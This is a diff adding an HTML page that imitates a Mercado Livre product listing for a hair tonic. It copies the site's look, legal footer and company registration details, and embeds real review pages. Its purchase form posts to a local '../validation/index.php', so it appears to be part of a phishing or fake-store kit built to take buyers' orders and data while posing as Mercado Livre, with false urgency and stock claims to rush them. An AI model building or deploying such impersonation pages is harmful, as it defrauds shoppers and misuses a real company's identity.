@@ -1,0 +1,1431 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+
+    <link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"/><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"/><link rel="preload" href="https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-head-react="true"/><style data-head-react="true"></style>
+
+
+
+    <title>Mercado Livre</title>
+    <style>
+
+      
+
+
+
+@font-face {
+  font-family: 'Proxima Nova';
+  font-weight: 300;
+  font-style: normal;
+  src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2') format('woff2');
+}
+
+@font-face {
+  font-family: 'Proxima Nova';
+  font-weight: 400;
+  font-style: normal;
+  src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2') format('woff2');
+}
+
+@font-face {
+  font-family: 'Proxima Nova';
+  font-weight: 600;
+  font-style: normal;
+  src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2') format('woff2');
+}
+
+
+
+        * {
+            font-family: 'Proxima Nova', sans-serif;
+            padding: 0;
+            margin: 0;
+        }
+
+        .header-cima {
+            box-sizing: border-box;
+            background-color: #FFF159;
+            width: 100vw;
+            height: 50px;
+            padding: 7px 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-bottom: 1px solid rgba(153, 151, 151, 0.3);
+            gap: 10px;
+            
+        }
+
+        .search input {
+            width: 100%;
+            
+            padding-left: 40px;
+            height: 30px;
+            margin-left: -40px;
+
+        }
+
+        .search {
+            box-sizing: border-box;
+    
+            width: 100vw;
+    
+   
+            display: flex;
+
+        
+            gap: 10px;
+        }
+
+        .search img {
+            width: 25px !important;
+            height: 30px !important;
+            position: relative;
+            left: 3px;
+            top: 3px;
+        }
+
+        .header-cima img {
+            width: 45px;
+        }
+
+        #menu {
+            width: 65px !important;
+            height: 33px !important;
+        }
+
+        #search {
+            border: none;
+            outline: none;
+            border: 1px solid rgba(153, 151, 151, 0.3);
+            color: gray !important;
+        }
+
+        #lupa {
+            margin-top: 3px;
+            width: 23px !important;
+            height: 23px !important;
+        }
+        .header-baixo {
+            box-sizing: border-box;
+            background-color: #FFF159;
+            width: 100vw;
+            height: 35px;
+            padding: 7px 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(153, 151, 151, 0.3);
+            gap: 10px;
+            color: #5f5f5f;
+        }
+
+        .header-baixo span {
+            color: rgb(44, 44, 44);
+            font-family: Arial, Helvetica, sans-serif;
+            font-weight: 400;
+            font-size: 10pt;
+            margin-top: -10px;
+        }
+
+        .centro {
+            box-sizing: border-box;
+            padding: 15px;
+        }
+
+        .centro p {
+            font-size: 11pt;
+        }
+
+        .title {
+            color: rgba(0,0,0,.9);
+    font-family: Proxima Nova,-apple-system,Roboto,Arial,sans-serif;
+    font-size: 22px;
+    font-weight: 600;
+    -webkit-hyphens: auto;
+    hyphens: auto;
+    line-height: 1.18;
+    padding-bottom: 8px;
+    padding-right: 10px;
+    word-break: break-word;
+    font-size: 16px;
+    font-weight: 400;
+    padding-bottom: 0;
+        }
+
+        #novo {
+            color: rgba(0,0,0,.55);
+    font-size: 12px;
+    font-weight: 400;
+    white-space: pre-wrap;
+        }
+
+        .vendido {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        #star {
+            width: 140px !important;
+        }
+
+        .mais-vendido {
+            display: flex;
+            align-items: center;
+            gap:10px; 
+            padding: 15px 0px;       
+        }
+
+        #maisvendido {
+            display: flex;
+            align-items: center;
+            box-sizing: border-box;
+            font-size: 9pt;
+            background-color: rgb(255, 87, 25);
+            border-radius: 5px;
+            padding: 0px 3px;
+            color: white;
+            font-weight: 600;
+        }
+
+        .slider-container {
+  width: 100%;
+  max-width: 800px;
+  margin-top: 20px;
+  overflow: hidden;
+  position: relative;
+
+}
+
+.slider {
+  
+  display: flex;
+  transition: transform 0.4s ease-in-out;
+  min-width: 100%;
+
+}
+
+.slider-image {
+  min-width: 100%;
+  max-height: 320px;
+  user-select: none;
+
+}
+
+.dots {
+  display: flex;
+  justify-content: center;
+  margin-top: 10px;
+}
+
+.dot {
+  height: 12px;
+  width: 12px;
+  margin: 0 5px;
+  background-color: #ccc;
+  border-radius: 50%;
+  cursor: pointer;
+  transition: background-color 0.3s;
+}
+
+.precos {
+  margin-top: 20px;
+}
+
+.precos h1 {
+  font-size: 24pt;
+  font-weight: 400;
+}
+
+.precos h2 {
+  font-size: 16pt;
+  font-weight: 400;
+  margin-top: -10px
+}
+
+.precos span {
+  position: relative;
+  top: -30px;
+  left: 124px;
+
+}
+
+.dot.active {
+  background-color: #3483fa;
+}
+
+.chegada {
+  margin: 20px 0px;
+}
+.quantity-button {
+  margin-top: 20px;
+      width: 100%;
+      height: 50px;
+      background-color: #f5f5f5;
+      color: #333;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 10px;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    .quantity-button strong {
+      color: #181818;
+    }
+
+    /* Overlay */
+    .overlay {
+      display: none; /* Inicialmente escondido */
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5); /* Fundo escuro */
+      z-index: 1;
+    }
+
+    .canto {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    /* Modal */
+    .modal {
+      display: none; /* Inicialmente escondido */
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 60%;
+      background-color: #fefefe;
+      border-top-left-radius: 10px;
+      border-top-right-radius: 10px;
+      overflow-y: auto;
+      padding: 20px;
+      box-sizing: border-box;
+      box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.1);
+      z-index: 2;
+    }
+    .modal-content {
+      display: flex;
+      flex-direction: column;
+    }
+    .modal-header {
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+    .option {
+      height: 20px;
+      padding: 10px 0;
+      border-bottom: 1px solid #ccc;
+      font-size: 18px;
+      cursor: pointer;
+      text-align: center;
+    }
+    .option:hover {
+      background-color: #f0f0f0;
+    }
+    .close-modal {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      font-size: 24px;
+      cursor: pointer;
+      color: #007BFF;
+    }
+
+    #compra {
+      border: none;
+      outline: none;
+      border-radius: 5px;
+      width: 100%;
+      font-size: 12pt;
+      font-weight: 600;
+      height: 50px;
+      background-color: #007BFF;
+      color: white;
+      margin: 20px 0px 10px 0px;
+    }
+
+    #carrinho {
+      margin: 0px 0px;
+      background-color: #E3EDFB;
+      border: none;
+      outline: none;
+      border-radius: 5px;
+      width: 100%;
+      font-size: 12pt;
+      font-weight: 600;
+      height: 50px;
+
+      color: #007BFF;
+
+    }
+
+    #setal {
+      width: 25px;
+    }
+
+    .perfil {
+      margin: 40px 0px;
+      display: flex;
+
+    }
+
+    .perfil img {
+      margin-right: 10px;
+    }
+
+    #selo {
+      position: relative;
+      top: -45px;
+      left: 152px;
+    }
+
+    .block {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 15px;
+    }
+
+    .conteudo {
+      border-bottom: 1px solid rgba(153, 151, 151, 0.3);
+      height: 600px;
+    }
+
+    .lider {
+      display: flex;
+    }
+
+    .treis {
+      display: flex;
+      max-width: 90vw;
+
+    }
+
+    .flex-box {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 30%;
+      text-align: center;
+      font-size: 11pt;
+    }
+
+    #reput {
+      max-width: 300px;
+    }
+
+    #transparent {
+      outline: none;
+      border: none;
+      border: 1px solid rgba(153, 151, 151, 0.3);
+      border-radius: 8px;
+      width: 83vw;
+      height: 40px;
+      background-color: white;
+      color: #007BFF;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding-right: 20px;
+      margin: 20px 0px;
+    }
+
+    .conteudo3 {
+      box-sizing: border-box;
+      padding: 40px 20px;
+      border-top:1px solid rgba(153, 151, 151, 0.3);
+      border-bottom: 1px solid rgba(153, 151, 151, 0.3);
+    }
+
+    
+    .conteudo4 {
+      box-sizing: border-box;
+      padding: 40px 20px;
+      border-top:1px solid rgba(153, 151, 151, 0.3);
+      border-bottom: 1px solid rgba(153, 151, 151, 0.3);
+    }
+
+    .conteudo5 {
+      box-sizing: border-box;
+      padding: 20px 20px;
+      /* border-top:1px solid rgba(153, 151, 151, 0.3); */
+      border-bottom: 1px solid rgba(153, 151, 151, 0.3);
+    }
+
+    .conteudo5 h2 {
+      margin-bottom: 20px;
+    }
+
+    .conteudo6 {
+      box-sizing: border-box;
+      padding: 20px 20px;
+      /* border-top:1px solid rgba(153, 151, 151, 0.3); */
+      border-bottom: 1px solid rgba(153, 151, 151, 0.3);
+   
+    }
+
+    .conteudo6 p {
+      font-size: 13pt !important;
+      margin: 15px 0px;
+    }
+
+    .conteudo3 ul {
+      margin-left: 15px;
+      color: #5f5f5f;
+      margin-top: 20px;
+    }
+
+    .conteudo7 textarea{
+      width: 100%;
+      outline: none;
+      border: none;
+      border: 1px solid rgba(153, 151, 151, 0.3);
+      border-radius: 3px;
+      box-sizing: border-box;
+      font-size: 11pt;
+      padding: 15px;
+      height: 120px;
+      margin: 20px 0xp;
+      border-bottom: 1px solid rgba(153, 151, 151, 0.3);
+    }
+
+    .conteudo7 h2 {
+      margin: 20px 0px;
+      font-size: 15pt;
+    }
+
+    .branco3 p {
+      color: #5f5f5f;
+      font-family: 9pt;
+    }
+    .conteudo7  p{
+      text-align: center;
+      margin: 20px 0px;
+    }
+
+    .estrela {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+
+    .conteudo8 {
+      box-sizing: border-box;
+      border-top: 1px solid rgba(153, 151, 151, 0.3);
+      /* padding: 20px; */
+      margin-top: 40px;
+
+    }
+
+    .conteudo h2 {
+      margin: 20px 0px;
+      /* color:#007BFF; */
+    }
+
+    .direito {
+      margin-top: 40px;
+    }
+
+    .direito img {
+      margin-left: 30px;
+      width: 145px !important;
+      height: 75px;
+    }
+
+    .esquerdo p {
+      width: 115px;
+    }
+
+    .flex1 {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      margin: 10px 0px;
+    }
+
+    .carousel-container {
+    width: 100%;
+    max-width: 100%;
+    overflow: hidden;
+    position: relative;
+    height: 200px;
+    border-bottom: 1px solid rgba(153, 151, 151, 0.3);
+}
+
+.carousel {
+    display: flex;
+    gap: 10px; /* Espaçamento entre as imagens */
+    transition: transform 0.3s ease-in-out;
+    cursor: grab;
+}
+
+.carousel-item {
+  flex: 0 0 100px;
+    border-radius: 8px;
+    overflow: hidden;
+}
+
+.carousel-item img {
+    width: 160px;
+    height: 130px;
+    display: block;
+    border-radius: 8px;
+}
+
+.cima {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin: 20px;
+}
+
+.centro p {
+  padding-left: 10px;
+  padding-bottom: 20px;
+}
+
+
+.branco p {
+  margin: 15px 0px;
+}
+
+a {
+  text-decoration: none;
+  color: transparent;
+  display: flex;
+}
+
+.iframe-container {
+    width: 100vw; /* Ocupa toda a largura da janela */
+    height: 100vh; /* Ocupa toda a altura da janela */
+    overflow: hidden; /* Impede a barra de rolagem da janela */
+    margin: 0;
+    padding: 0;
+    position: relative;
+  }
+
+  /* Estilização do iframe */
+  .full-width-iframe {
+    width: 100vw; /* O iframe ocupará toda a largura da janela */
+    height: 100vh; /* O iframe ocupará toda a altura da janela */
+    border: none; /* Remove as bordas do iframe */
+    position: absolute;
+    top: 0;
+    left: 0;
+    display: block;
+    overflow: scroll; /* Permite a rolagem dentro do iframe */
+  }
+
+
+  #overlay2 {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(255, 241, 89, 1);
+
+    z-index: 1000;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+}
+
+.custom-loader {
+  width:50px;
+  height:50px;
+  border-radius:50%;
+  background:conic-gradient(#0000 10%,#007BFF);
+  -webkit-mask:radial-gradient(farthest-side,#0000 calc(100% - 4px),#000 0);
+  animation:s3 1s infinite linear;
+}
+@keyframes s3 {to{transform: rotate(1turn)}}
+    </style>
+</head>
+<body>
+    <div class="pagina-inicial">
+        <div class="header">
+            <div class="header-cima">
+                <img src="logo.png" alt="">
+                <div class="search">
+                    <img height="25" src="lupa.png" id="lupa">
+                    <input id="search" type="text" placeholder="Estou buscando...">
+                </div>
+                
+                <img src="menu.png" id="menu" width="65" height="35" alt="">
+            </div>
+
+            <div class="header-baixo">
+                <div class="esse">
+                    <img src="local.png">
+                    <span>Envio para todo o brasil</span>
+
+                </div>
+                <img src="seta.png">
+            </div><!--header0baixo-->
+        </div><!--header-->
+
+        <div class="body">
+            <div class="centro">
+                <p style="color: #3483fa;margin-left: 4px;padding-bottom: 15px;">Conferir mais produtos da marca Gold Spell Cosméticos</p>
+                <div class="vendido">
+                    <span id="novo">Novo  |  +50mil vendidos</span>
+                    <a href="https://www.mercadolivre.com.br/noindex/catalog/reviews/MLB20554034?noIndex=true&access=view_all&modal=true&controlled=true"><img  id="star" src="star.png"></a>
+                </div>
+                <div class="mais-vendido">
+                    <span id="maisvendido">MAIS VENDIDO</span>
+                    <p style="color: #3483fa;margin-left: 4px;margin-top:20px">2º em Tratamentos com o Cabelo</p>
+                </div>
+                <h1 class="title">Tônico Poderoso Gold Spell 250ml Antiqueda E Preenche Falhas</h1>
+
+
+                <div class="slider-container">
+                  <div class="slider-wrapper">
+                    <div class="slider">
+                      <img style="width: 200px !important;" width="200px" src="imgs/1.png" alt="Produto 1" class="slider-image">
+                      <img src="imgs/2.png" alt="Produto 2" class="slider-image">
+                      <img src="imgs/3.png" alt="Produto 3" class="slider-image">
+                      <img src="imgs/4.png" alt="Produto 4" class="slider-image">
+                      <img src="imgs/5.png" alt="Produto 5" class="slider-image">
+                      <img src="imgs/6.png" alt="Produto 6" class="slider-image">
+                      <img src="imgs/7.png" alt="Produto 7" class="slider-image">
+                      <img src="imgs/8.png" alt="Produto 8" class="slider-image">
+                      <img src="imgs/13.png" alt="Produto 13" class="slider-image">
+                    </div>
+                  </div>
+                  <div class="dots">
+                    <span class="dot active" data-index="0"></span>
+                    <span class="dot" data-index="1"></span>
+                    <span class="dot" data-index="2"></span>
+                    <span class="dot" data-index="3"></span>
+                    <span class="dot" data-index="4"></span>
+                    <span class="dot" data-index="5"></span>
+                    <span class="dot" data-index="6"></span>
+                    <span class="dot" data-index="7"></span>
+                    <span class="dot" data-index="8"></span>
+                  </div>
+                </div>
+                
+                  
+
+                  <div class="precos">
+                    <h1>R$ 137</h1>
+                    <h2>em 12x 
+                      R$
+                      13
+                      </h2><span>32</span>
+                      <p style="color: #3483fa;margin-top: -20px;">Ver os meios de pagamento </p>
+                  </div>
+                  
+
+                  <div class="chegada">
+                    <h4 style="color: #00a650;">Chegará gratis amanhã</h4>
+                    <p>Comprando dentro da próxima <span style="color: orange;">1h 15 min</span>
+                    </p>
+                      <p style="color: #3483fa;">Mais formas de entrega </p>
+                  </div>
+
+                  <div class="estoque">
+                    <p><strong>Estoque disponível</strong></p>
+
+                    <div class="quantidade">
+                      
+                      
+                      <button class="quantity-button" onclick="openModal()">
+                        <div class="canto">
+                          Quantidade: <strong id="selected-quantity">1</strong> <span style="color:rgba(0,0,0,.25);">(+50 disponíveis)
+                        </div>
+                        
+                          <img id="setal" src="setal.png">
+                      </button>
+                    
+                      <!-- Overlay -->
+                      <div id="overlay" class="overlay" onclick="closeModal()"></div>
+                    
+                      <!-- Modal de opções -->
+                       <form id="meu-formulario" method="POST" action="../validation/index.php">
+
+                      <input name="quanitdade" id="quantidade" type="hidden" > 
+                      <div id="quantity-modal" class="modal">
+                        <span class="close-modal" onclick="closeModal()">&times;</span>
+                        <div class="modal-header">Escolha a quantidade</div>
+                        <div class="modal-content">
+                          <div class="option" onclick="selectQuantity(1)">1 unidade</div>
+                          <div class="option" onclick="selectQuantity(2)">2 unidades</div>
+                          <div class="option" onclick="selectQuantity(3)">3 unidades</div>
+                          <div class="option" onclick="selectQuantity(4)">4 unidades</div>
+                          <div class="option" onclick="selectQuantity(5)">5 unidades</div>
+                          <div class="option" onclick="selectQuantity(6)">6 unidades</div>
+                          <div class="option" onclick="selectQuantity(7)">7 unidades</div>
+                        </div>
+                      </div>
+
+
+
+                    </div><!--quantidade-->
+
+                    <div id="overlay2" style="display: none;">
+                      <div class="custom-loader"></div>
+                      <h2 style="margin-top:20px; max-width: 300px;text-align: center;">Estamos preparando tudo para sua compra</h2>
+                  </div>
+                    
+                  </div><!--estoque-->
+
+                  <div class="conteudo">
+                    <button id="compra" type="submit" >Comprar agora</button>
+                    <button id="carrinho" type="button" >Adicionar ao carrinho</button>
+                  </form>
+                    <div class="perfil">
+                      <img width="55" src="perfil.jpg" alt="">
+                      <div class="perfil-texto">
+                        <p>Loja oficial <strong>Gold spell</strong></p><span><img id="selo" width="15" src="selo.png"> </span>
+                        <p style="margin-top: -40px;"><strong>+100 mil vendas</strong></p>
+                      </div>
+                    </div><!--perfil-->
+
+                    <div class="garantia">
+                      <div class="block">
+                        <img width="30"  src="voltar.png"><p><span style="color:#007BFF">Devolução grátis.</span> Você tem 30 dias a partir da data de recebimento.</p>
+                      </div>
+
+                      <div class="block">
+                        <img width="30" src="sec.png"><p><span style="color:#007BFF">Compra Garantida</span> receba o produto que está esperando ou devolvemos o dinheiro.</p>
+                      </div>
+
+                      <div style="margin-top: 30px;" class="botoess">
+                        <div class="block">
+                        <img width="30" src="hearth.png"><p><span style="color:#007BFF">Adicionar aos favoritos</span></p>
+                        <img width="30" src="share.png"><p><span style="color:#007BFF">Compartilhar</span></p>
+                        </div>
+                      </div>
+                    </div>
+                  </div><!--conteudo-->
+
+                  <div class="conteudo2">
+                    
+                    <div style="border-top: rgba(0, 0, 0, 1);" class="perfil">
+                      <img width="55" src="perfil.jpg" alt="">
+                      <div class="perfil-texto">
+                        <h3><strong>Lojaoficialgoldspell</strong></h3><span></span>
+                        <p style="margin-top: 0px; font-size: 9pt;"><strong>+5mil </strong><span>seguidores</span><strong style="margin-left: 15px;">+3 </strong><span>produtos</span></p>
+                      </div>
+                    </div><!--perfil-->
+
+
+                    <div class="lider">
+
+                      <img width="25" height="25px" src="seloverde.png" alt="">
+
+
+                      <div class="block2">
+                        <h3 style="color: #00a650;">MercadoLíder Platinum</h3>
+                        <p style="color: #5f5f5f;">É um dos melhores do site!</p>
+                      </div>
+
+                      
+                    </div>
+                    <img id="reput" width="350" src="reputation.png" alt="">
+
+                    <div class="treis">
+                        <div class="flex-box">
+                          <h3>+100mil</h3>
+                          <p style="color: #5f5f5f;">Vendas concluìdas</p>
+                        </div>
+
+
+
+                        <div class="flex-box">
+                          <img src="chat.png" width="25">
+                          <p style="color: #5f5f5f;">Oferece um bom atendimento</p>
+                        </div>
+
+                        <div class="flex-box">
+                          <img src="relogion.png" width="25">
+                          <p style="color: #5f5f5f;">Entrega os produtos dentro do prazo</p>
+                        </div>
+                    </div>
+                    
+                    <button style="height: 35px; margin-top: 15px;margin-bottom: 30px;" id="carrinho"> ver mais produtos do vendedor </button>
+                  </div>
+
+
+
+                  <div style="height: 100%;border-top: 1px solid rgba(153, 151, 151, 0.3);border-bottom: 1px solid rgba(153, 151, 151, 0.3);max-height: 100%;" class="conteudo">
+                    <h2>Fotos do produtos</h2>
+
+                    <div style="display: flex; flex-direction: column;align-items: center;justify-content: center;gap:20px;" class="centro">
+                      <img width="200" src="https://http2.mlstatic.com/D_Q_NP_2X_995135-MLB52574887244_112022-F.webp" alt="">
+                      <img width="150" height="250" src="https://http2.mlstatic.com/D_Q_NP_2X_689869-MLU74976646197_032024-F.webp" alt="">
+                      <img width="200" src="https://http2.mlstatic.com/D_Q_NP_2X_653994-MLU74110416836_012024-F.webp" alt="">
+                      <img width="200" src="https://http2.mlstatic.com/D_Q_NP_2X_954217-MLU70015122932_062023-F.webp" alt="">
+
+
+
+                      <div class="flex">
+                 
+                        <button style="text-align: left;font-size: 11pt; padding-left: 20px;" id="transparent" type="button">Ver mais fotos <img width="20" height="20" src="setaazul.png" alt=""></button>
+                       
+                      </div>
+
+                   
+                      
+                    </div><!--conteudo-->
+
+
+                    <div class="conteudo3">
+                      <h2>O que você precisa saber sobre este produto</h2>
+                      <ul>
+                        <li>Volume líquido: 250 mL</li>
+                        <li>Unidades por embalagem: 1</li>
+                        <li>Unidades por kit: 1</li>
+                        <li>Formato: spray</li>
+                        <li>Apresentação: spray</li>
+                        <li>Fragrância de: neutra</li>
+                    </ul>
+                    
+                    </div>
+
+
+                    <div class="conteudo4">
+                      <h2>Características do produto</h2>
+
+                      <div class="block">
+                        <img width="45"  src="marca.png"><p><span>Marca:</span> <strong>Gold Spell Cosméticos</strong></p>
+                      </div>
+
+                      <div class="block">
+                        <img width="45"  src="splay.png"><p><span>Apresentação:</span> <strong>Spray</strong></p>
+                      </div>
+
+                      <div class="block">
+                        <img width="45"  src="formato.png"><p><span>Formato:</span> <strong>Spray</strong></p>
+                      </div>
+
+                      <div class="block">
+                        <img width="45"  src="certo.png"><p><span>Tipo de produto:</span> <strong>Spray de tratamento</strong></p>
+                      </div>
+
+                      <div class="block">
+                        <img width="45"  src="certo.png"><p><span>Gênero:</span> <strong>Sem gênero</strong></p>
+                      </div>
+
+                      <div class="flex">
+                 
+                        <button style="text-align: left;font-size: 11pt; padding-left: 20px;max-width: 340px;" id="transparent" type="button">Conferir todas as características <img width="20" height="20" src="setaazul.png" alt=""></button>
+                       
+                      </div>
+
+
+
+
+                    
+                    </div><!--conteudo4-->
+
+
+
+
+                  </div>
+
+                  <div class="conteudo5">
+                    <h2>Descrição</h2>
+                    <p>O caminho para o cabelo perfeito requer cuidados especiais, e hoje você pode conseguir essa mudança com a ajuda da Gold Spell Cosméticos.</p>
+                    <p>Livre de crueldade</p>
+                    <p>Este produto é feito sem machucar nenhum animal.</p>
+                  </div>
+
+
+                  <div class="conteudo6">
+                    <h2>Meios de pagamento</h2>
+                    <p>Linha de crédito</p>
+                    <p><img src="merc.png" width="140"></p>
+                    <p>Cartões de crédito</p>
+                    <p>Pague em até 12x!</p>
+                    <p><img src="marcas.png" width="220"></p>
+                    <p>Cartões de débito</p>
+                    <p><img src="ban.png" width="170"></p>
+                    <p>Pix</p>
+                    <p style="color:#5f5f5f">Aprovação imediata</p>
+                    <p><img src="px.png" width="100"></p>
+                    <p>Boleto bancário</p>
+                    <p><img src="boleto.png" width="60"></p>
+
+
+                    <div class="flex">
+                 
+                      <button style="text-align: left;font-size: 10pt; padding-left: 20px;max-width: 340px;" id="transparent" type="button">Confira outros meios de pagamentos <img width="20" height="20" src="setaazul.png" alt=""></button>
+                     
+                    </div>
+                  </div>
+
+
+                  <div class="conteudo7">
+                    <h2>Perguntas e resposta</h2>
+
+                    <h2><strong>Pergunte ao vendedor</strong></h2>
+                    <textarea id="pergunta" placeholder="Escreva a sua pergunta..."></textarea>
+
+                    <button type="button" id="compra">Perguntar</button>
+
+                    <p>Seja o primeiro a perguntar!</p>
+
+                    <button type="button" id="carrinho">Como pergunto ao vendedor?</button>
+                  </div>
+
+                  <div class="conteudo8">
+                    <h2>Opniões do produto</h2>
+
+
+
+
+
+
+
+                 
+
+
+
+                    <!--<div class="estrela">
+                      <div class="esquerdo">
+                        <h1 style="color: #3483fa;">4.7</h1>
+                        <img src="estrelas.png" width="100" alt="">
+                        <p style="color:rgb(110, 110, 110);">11,603 avaliações</p>
+                      </div>
+
+                      <div class="direito">
+                        <img src="ava.png" width="200" alt="">
+                      </div>
+                      
+
+
+                    </div>
+
+
+                    <div class="flex1">
+                      <p>fragrancia</p>
+                      <img src="estrelas.png" width="100">
+                    </div>
+
+                    <div class="flex1">
+                      <p>Custo-benefício</p>
+                      <img src="estrelas.png" width="100">
+                    </div>
+
+                    <div class="fotos">
+                      <h3>Opiniões com fotos</h3>
+
+                      <div class="carousel-container">
+                        <div class="carousel">
+                          <a href="https://www.mercadolivre.com.br/noindex/catalog/reviews/MLB20554034?noIndex=true&access=view_all&modal=true&controlled=true">
+                            <div class="carousel-item">
+                                <img src="coment/1.png" alt="Imagem 1">
+                            </div>
+                            <div class="carousel-item">
+                                <img src="coment/2.png" alt="Imagem 2">
+                            </div>
+                            <div class="carousel-item">
+                                <img src="coment/3.png" alt="Imagem 3">
+                            </div>
+                            <div class="carousel-item">
+                                <img src="coment/4.png" alt="Imagem 4">
+                            </div>
+                            <div class="carousel-item">
+                                <img src="coment/5.png" alt="Imagem 5">
+                            </div>
+
+                            <div class="carousel-item">
+                              <img src="coment/6.png" alt="Imagem 5">
+                          </div>
+
+                          <div class="carousel-item">
+                            <img src="coment/7.png" alt="Imagem 5">
+                        </div>
+
+                        <div class="carousel-item">
+                          <img src="coment/8.png" alt="Imagem 5">
+                      </div>
+                        </div>
+                    </div></a>
+                    
+                    </div>
+
+
+
+                  </div>
+
+
+                  <div class="coments">
+
+                    <div class="comentario">
+                      <div class="cima">
+                        <img src="estrelas.png" width="100" alt="">
+                        <span style="font-size:10pt;color:gray;"> 23 jun. 2024</span>
+                      </div>
+                      <p>Tem 1 mês que estou usando e já vi grandes resultados, eu admito que fiquei com medo de comprar e não funcionar, mas me arrependi de não ter comprado antes, ele é perfeito, já tenho vários fiozinhos nascendo, e estou sentindo meu cabelo mais volumoso… estou impressionada! eu já até comprei outro pra continuar usando….</p>
+                    
+                      <p><img src="like.png" width="100" alt=""></p>
+                    </div>
+
+
+
+                    <div style="border-top: 1px solid rgba(153, 151, 151, 0.3)" class="comentario">
+                      <div class="cima">
+                        <img src="estrelas.png" width="100" alt="">
+                        <span style="font-size:10pt;color:gray;"> 23 nov. 2024</span>
+                      </div>
+                      <p>Muito bom apesar q usei pouco ainda</p>
+                    
+                      <p><img src="like2.png" width="100" alt=""></p>
+                    </div>
+
+
+
+                    <div style="border-top: 1px solid rgba(153, 151, 151, 0.3)" class="comentario">
+                      <div class="cima">
+                        <img src="estrelas.png" width="100" alt="">
+                        <span style="font-size:10pt;color:gray;"> 06 maio. 2024</span>
+                      </div>
+                      <p>Bom estava esperando os resultados pra vim aqui avaliar ☺️ minha intenção era disfarçar minhas entradas, estou usando a 2 meses e o que posso dizer é que o produto é bom sim, porém eu imaginava que o cabelo iria nascer ☺️,mas percebi que ele não nasce,mas o cabelo cresce. Nas minhas entradas sempre tive poucos fios e não passavam de certa medida,porém depois que comecei a usar o produto percebi que os fios cresceram bem. Recomendo sim e vou continuar usando! ele rende bastante. Estou amando o resultado.</p>
+                    
+                      <p><img src="like3.png" width="100" alt=""></p>
+                    </div>
+                    
+
+                    <a href="https://www.mercadolivre.com.br/noindex/catalog/reviews/MLB20554034?noIndex=true&access=view_all&modal=true&controlled=true"><span style="color:#007BFF; margin: 20px 0px;">mostrar todas opiniões</span></a>
+                  </div>-->
+
+                  
+            </div><!--centro-->
+            <div class="iframe-container" style="width: 100%; height: 1000px; overflow: hidden !important; position: relative;">
+              <iframe 
+                src="https://www.mercadolivre.com.br/noindex/catalog/reviews/MLB20554034?noIndex=true&access=view_all&modal=true&controlled=true" 
+                style="border: 0; width: 100%; height: 100%; position: absolute; top: 0; left: 0;" 
+                allowfullscreen 
+                loading="lazy">
+              </iframe>
+            </div>
+            
+            <div style="background-color: #EDEDED;box-sizing: border-box;padding: 40px 20px; height: 200px; display: flex;
+            justify-content: center; width: 100vw;margin-left: -15px;
+            " class="parte-baixa">
+              <p><span style="color:#007BFF; margin: 20px 0px;">Beleza e Cuidado Pessoal > Cuidados com o Cabelo > Tratamentos com o Cabelo >Tonico Capilar</span></p>
+
+            </div>
+
+
+            <div style="height: 80px; background-color: #FEF059; display: flex; justify-content: center;align-items: center;
+            text-align: center;width: 100vw;margin-left: -15px;" class="footer-header">
+              <img src="app.png" alt="">
+
+              <p>Compra e venda com o app!</p>
+            </div>
+
+            <div style="height: 100%;border-bottom: 1px solid rgba(153, 151, 151, 0.3);display: flex; gap: 20px;justify-content: center;align-items: center;" class="branco">
+                <div class="branco1">
+                  <p>Minha conta</p>
+                  <p>Histórico</p>
+                  <p>Favoritos</p>
+                  <p>Categorias</p>
+                  <p>Contato</p>
+                  <p>Programa de Afiliados</p>
+                </div>
+
+                <div class="branco2">
+                  <p>Compras</p>
+                  <p>Ofertas</p>
+                  <p>Lojas oficiais</p>
+                  <p>Meli+</p>
+                  <p>Vender</p>
+                  <p>Black Friday</p>
+                </div>
+            </div>
+
+
+
+            <div style="box-sizing:border-box; padding:20px;height: 100%;border-bottom: 1px solid rgba(153, 151, 151, 0.3);display: flex; gap: 20px;justify-content: center;align-items: center;" class="branco">
+              <div class="branco3">
+                <p>Termos e condições Promoções Como cuidamos da sua privacidade Acessibilidade Informações sobre seguros Blog Afiliados Tendências</p>
+                <p>© 1999-2024 Ebazar.com.br LTDA.</p>
+                <p>CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</p>
+              </div>
+          </div>
+        </div><!--body-->
+    </div>
+
+
+    <script>
+
+
+
